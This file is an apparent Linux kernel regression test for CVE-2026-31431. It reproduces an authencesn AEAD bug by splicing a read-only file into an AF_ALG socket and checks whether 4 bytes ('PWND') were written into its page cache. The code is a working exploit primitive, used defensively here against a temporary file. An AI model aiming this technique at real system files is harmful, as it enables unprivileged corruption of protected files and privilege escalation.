// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Copyright (C) 2026 SUSE LLC Andrea Cervesato <andrea.cervesato@suse.com>
 */

/*\
 * Test for CVE-2026-31431 ("Copy Fail") fixed in kernel v7.0:
 * a664bf3d603d ("crypto: algif_aead - Separate src from dst")
 *
 * A logic bug in authencesn, the kernel's AEAD wrapper for IPsec Extended
 * Sequence Numbers, allows an unprivileged user to write 4 controlled bytes
 * into the page cache of any readable file. During AEAD decryption,
 * authencesn uses the destination scatterlist as scratch space for ESN byte
 * rearrangement. When data is spliced from a file into an AF_ALG socket, the
 * 2017 in-place optimization (72548b093ee3) places page cache pages into the
 * writable destination scatterlist. authencesn's scratch write then corrupts
 * those pages.
 *
 * The test creates a file with known data, attempts page cache corruption via
 * the AF_ALG + splice technique, and verifies whether the file content was
 * modified.
 *
 * Reproducer based on:
 * https://github.com/theori-io/copy-fail-CVE-2026-31431
 */

#include "tst_test.h"
#include "tst_af_alg.h"
#include "lapi/socket.h"
#include "lapi/splice.h"

#define TESTFILE "copy_fail"
#define OVERWRITE_SIZE 4
#define AEAD_AUTHSIZE 4
#define AEAD_ASSOCLEN 8
#define AES_IV_SIZE 16
#define SPI_SIZE 4

static const uint8_t original[OVERWRITE_SIZE] = { 'X', 'X', 'X', 'X' };
static const uint8_t payload[OVERWRITE_SIZE] = { 'P', 'W', 'N', 'D' };

/*
 * authenc key format: struct rtattr header (8 bytes) +
 * HMAC-SHA256 key (16 bytes) + AES-128 key (16 bytes)
 */
static const uint8_t authenc_key[] = {
#if __BYTE_ORDER == __LITTLE_ENDIAN
	0x08, 0x00, 0x01, 0x00,
#else
	0x00, 0x08, 0x00, 0x01,
#endif
	0x00, 0x00, 0x00, 0x10,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

static int algfd = -1;
static int reqfd = -1;
static int pipefd[2] = { -1, -1 };
static int file_fd = -1;

static void try_corrupt(void)
{
	const uint8_t iv[AES_IV_SIZE] = { 0 };
	uint8_t aad[AEAD_ASSOCLEN];
	char recvbuf[AEAD_ASSOCLEN];
	loff_t off_in = 0;

	algfd = -1;
	reqfd = -1;
	pipefd[0] = -1;
	pipefd[1] = -1;

	/* AAD[0..3] = SPI (don't care), AAD[4..7] = ESN scratch-write zone */
	memset(aad, 'A', SPI_SIZE);
	memcpy(aad + SPI_SIZE, payload, OVERWRITE_SIZE);

	algfd = tst_alg_setup("aead", "authencesn(hmac(sha256),cbc(aes))",
			      authenc_key, sizeof(authenc_key));
	SAFE_SETSOCKOPT(algfd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL,
			AEAD_AUTHSIZE);

	reqfd = tst_alg_accept(algfd);

	const struct tst_alg_sendmsg_params params = {
		.decrypt = true,
		.iv = iv,
		.ivlen = AES_IV_SIZE,
		.assoclen = AEAD_ASSOCLEN,
		.msg_flags = MSG_MORE,
	};

	tst_alg_sendmsg(reqfd, aad, sizeof(aad), &params);

	SAFE_PIPE(pipefd);

	TEST(splice(file_fd, &off_in, pipefd[1], NULL, OVERWRITE_SIZE, 0));
	if (TST_RET < 0)
		tst_brk(TBROK | TTERRNO, "splice(file -> pipe)");

	TEST(splice(pipefd[0], NULL, reqfd, NULL, OVERWRITE_SIZE, 0));
	if (TST_RET < 0)
		tst_brk(TBROK | TTERRNO, "splice(pipe -> AF_ALG)");

	/* Expected to fail (invalid ciphertext); triggers the scratch write */
	TST_EXP_FAIL_SILENT(recv(reqfd, recvbuf, sizeof(recvbuf), 0), EBADMSG);

	SAFE_CLOSE(pipefd[0]);
	SAFE_CLOSE(pipefd[1]);
	SAFE_CLOSE(reqfd);
	SAFE_CLOSE(algfd);
}

static void run(void)
{
	uint8_t readback[OVERWRITE_SIZE];

	file_fd = SAFE_OPEN(TESTFILE, O_WRONLY | O_CREAT, 0444);
	SAFE_WRITE(SAFE_WRITE_ALL, file_fd, original, OVERWRITE_SIZE);
	SAFE_CLOSE(file_fd);

	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
	try_corrupt();
	SAFE_CLOSE(file_fd);

	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
	SAFE_READ(1, file_fd, readback, sizeof(readback));
	SAFE_CLOSE(file_fd);

	if (memcmp(readback, original, OVERWRITE_SIZE) != 0)
		tst_res(TFAIL, "Page cache was corrupted via AF_ALG splice");
	else
		tst_res(TPASS, "Page cache was not corrupted");

	SAFE_UNLINK(TESTFILE);
}

static void cleanup(void)
{
	if (pipefd[0] != -1)
		SAFE_CLOSE(pipefd[0]);

	if (pipefd[1] != -1)
		SAFE_CLOSE(pipefd[1]);

	if (reqfd != -1)
		SAFE_CLOSE(reqfd);

	if (algfd != -1)
		SAFE_CLOSE(algfd);

	if (file_fd != -1)
		SAFE_CLOSE(file_fd);
}

static struct tst_test test = {
	.test_all = run,
	.cleanup = cleanup,
	.needs_tmpdir = 1,
	.tags = (const struct tst_tag[]) {
		{"linux-git", "a664bf3d603d"},
		{"CVE", "2026-31431"},
		{}
	},
};
